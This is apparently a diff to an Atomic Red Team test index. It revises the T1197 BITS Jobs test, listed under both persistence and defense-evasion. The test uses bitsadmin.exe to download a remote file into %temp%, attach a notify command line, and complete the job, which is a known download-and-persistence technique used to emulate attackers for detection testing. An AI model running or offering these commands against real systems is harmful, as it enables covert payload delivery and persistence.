@@ -9018,22 +9018,19 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: "%temp%\\bitsadmin_flag.ps1"
+          default: "%temp%\\bitsadmin3_flag.ps1"
         remote_file:
           description: Remote file to download
           type: url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-        command_line:
-          description: Command line to execute
-          type: string
-          default: "%temp%\\bitsadmin3_flag.ps1"
       executor:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
-          bitsadmin.exe /complete AtomicBITS
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
           bitsadmin.exe /resume #{bits_job_name}
+          timeout 5
+          bitsadmin.exe /complete #{bits_job_name}
         cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
@@ -20217,22 +20214,19 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: "%temp%\\bitsadmin_flag.ps1"
+          default: "%temp%\\bitsadmin3_flag.ps1"
         remote_file:
           description: Remote file to download
           type: url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-        command_line:
-          description: Command line to execute
-          type: string
-          default: "%temp%\\bitsadmin3_flag.ps1"
       executor:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
-          bitsadmin.exe /complete AtomicBITS
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
           bitsadmin.exe /resume #{bits_job_name}
+          timeout 5
+          bitsadmin.exe /complete #{bits_job_name}
         cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
